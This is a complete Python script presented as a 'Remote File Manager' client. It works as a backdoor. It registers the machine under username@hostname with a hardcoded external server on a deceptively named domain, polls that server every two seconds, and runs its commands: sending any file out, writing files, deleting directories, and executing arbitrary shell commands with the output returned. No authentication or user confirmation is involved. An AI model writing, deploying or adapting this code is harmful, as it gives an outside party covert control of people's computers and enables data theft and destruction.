#!/usr/bin/env python3
"""
Remote File Manager - Python Client
Zero dependencies, pure standard library
Automatically registers as username@hostname
Server: https://googleforum.pythonanywhere.com
"""

import base64
import getpass
import json
import os
import shutil
import subprocess
import socket
import sys
import time
import urllib.error
import urllib.request

# ============ CONFIG ============
SERVER_URL = "https://googleforum.pythonanywhere.com"
POLL_INTERVAL = 2  # seconds

# Auto-generate client ID from username + hostname
try:
    username = getpass.getuser()
except Exception:
    username = os.environ.get("USER") or os.environ.get("USERNAME") or "unknown"
hostname = socket.gethostname()
client_id = f"{username}@{hostname}"
client_name = f"{username} ({hostname})"

print("🔌 Remote File Manager Client")
print(f"   ID: {client_id}")
print(f"   Name: {client_name}")
print(f"   Server: {SERVER_URL}")


# ============ HTTP HELPERS ============
def request(method, url, data=None):
    """Send an HTTP request and return parsed JSON (or raw text on parse failure)."""
    body = None
    headers = {}
    if data is not None:
        body = json.dumps(data).encode("utf-8")
        headers["Content-Type"] = "application/json"
        headers["Content-Length"] = str(len(body))

    req = urllib.request.Request(url, data=body, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", errors="replace")
    except urllib.error.URLError:
        raise

    try:
        return json.loads(raw)
    except Exception:
        return raw


# ============ REGISTRATION ============
def register():
    try:
        request("POST", f"{SERVER_URL}/api/register", {
            "client_id": client_id,
            "name": client_name,
        })
        print("✅ Registered with server")
        return True
    except Exception as e:
        print(f"❌ Registration failed: {e}")
        return False


# ============ HEARTBEAT ============
def send_heartbeat():
    try:
        request("POST", f"{SERVER_URL}/api/heartbeat", {"client_id": client_id})
        return True
    except Exception:
        return False


# ============ RESOLVE PATH ============
def resolve_path(raw_path):
    if raw_path in ("/", "", "."):
        return "C:\\" if sys.platform == "win32" else "/"
    return raw_path


# ============ COMMAND HANDLERS ============
def handle_list(params):
    target = resolve_path(params.get("path") or ".")
    try:
        entries = os.listdir(target)
        items = []
        for name in entries:
            full = os.path.join(target, name)
            try:
                stat = os.stat(full)
                items.append({
                    "name": name,
                    "is_dir": os.path.isdir(full),
                    "size": stat.st_size,
                    "modified": stat.st_mtime * 1000,  # ms, like JS mtimeMs
                })
            except Exception as e:
                print(f"Skipping {name}: {e}")
        return {"success": True, "result": items}
    except Exception as e:
        return {"success": False, "error": str(e)}


def handle_download(params):
    path = resolve_path(params.get("path"))
    try:
        with open(path, "rb") as f:
            data = f.read()
        return {"success": True, "result": {
            "data": base64.b64encode(data).decode("ascii"),
            "size": len(data),
        }}
    except Exception as e:
        return {"success": False, "error": str(e)}


def handle_upload(params):
    directory = resolve_path(params.get("path") or ".")
    filename = params.get("filename")
    try:
        data = base64.b64decode(params.get("data", ""))
        full = os.path.join(directory, filename)
        with open(full, "wb") as f:
            f.write(data)
        return {"success": True, "result": {"path": full}}
    except Exception as e:
        return {"success": False, "error": str(e)}


def handle_delete(params):
    path = resolve_path(params.get("path"))
    try:
        if os.path.isdir(path):
            shutil.rmtree(path)
        else:
            os.remove(path)
        return {"success": True, "result": {"deleted": path}}
    except Exception as e:
        return {"success": False, "error": str(e)}


def handle_rename(params):
    old = resolve_path(params.get("old"))
    new = resolve_path(params.get("new"))
    try:
        os.rename(old, new)
        return {"success": True, "result": {"from": old, "to": new}}
    except Exception as e:
        return {"success": False, "error": str(e)}


def handle_open(params):
    path = resolve_path(params.get("path"))
    try:
        if sys.platform == "win32":
            os.startfile(path)  # Windows-only
        elif sys.platform == "darwin":
            subprocess.Popen(["open", path])
        else:
            subprocess.Popen(["xdg-open", path])
        return {"success": True, "result": {"opened": path}}
    except Exception as e:
        return {"success": False, "error": str(e)}


def handle_exec(params):
    command = params.get("command")
    cwd = resolve_path(params.get("cwd") or ".")
    try:
        proc = subprocess.run(
            command,
            cwd=cwd,
            shell=True,
            timeout=30,
            capture_output=True,
            text=True,
        )
        output = proc.stdout or ""
        if proc.stderr:
            output += ("\n" if output else "") + proc.stderr
        if proc.returncode != 0:
            return {"success": False,
                    "error": f"{command} exited with {proc.returncode}\n{output}"}
        return {"success": True, "result": {"output": output}}
    except subprocess.TimeoutExpired:
        return {"success": False, "error": "Command timed out"}
    except Exception as e:
        return {"success": False, "error": str(e)}


COMMAND_HANDLERS = {
    "list": handle_list,
    "download": handle_download,
    "upload": handle_upload,
    "delete": handle_delete,
    "rename": handle_rename,
    "open": handle_open,
    "exec": handle_exec,
}


# ============ POLLING ============
def poll_commands():
    try:
        response = request("GET", f"{SERVER_URL}/api/client/{client_id}/poll")
    except Exception:
        return
    if not isinstance(response, dict):
        return

    commands = response.get("commands") or []
    for cmd in commands:
        cid = cmd.get("id")
        name = cmd.get("command")
        params = cmd.get("params") or {}
        print(f"📨 Received command: {name} ({cid})")

        handler = COMMAND_HANDLERS.get(name)
        if handler:
            try:
                result = handler(params)
            except Exception as e:
                result = {"success": False, "error": str(e)}
        else:
            result = {"success": False, "error": f"Unknown command: {name}"}

        try:
            request("POST", f"{SERVER_URL}/api/client/{client_id}/result", {
                "command_id": cid,
                "result": result.get("result") if result.get("success") else None,
                "error": None if result.get("success") else result.get("error"),
            })
            print(f"✅ Command {cid} completed")
        except Exception as e:
            print(f"❌ Failed to send result for {cid}: {e}")


# ============ MAIN ============
def main():
    while not register():
        print("⏳ Retrying registration in 5s...")
        time.sleep(5)

    print("🔄 Starting polling loop...")
    while True:
        try:
            send_heartbeat()
            poll_commands()
        except KeyboardInterrupt:
            raise
        except Exception:
            pass
        time.sleep(POLL_INTERVAL)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n👋 Shutting down...")
        sys.exit(0)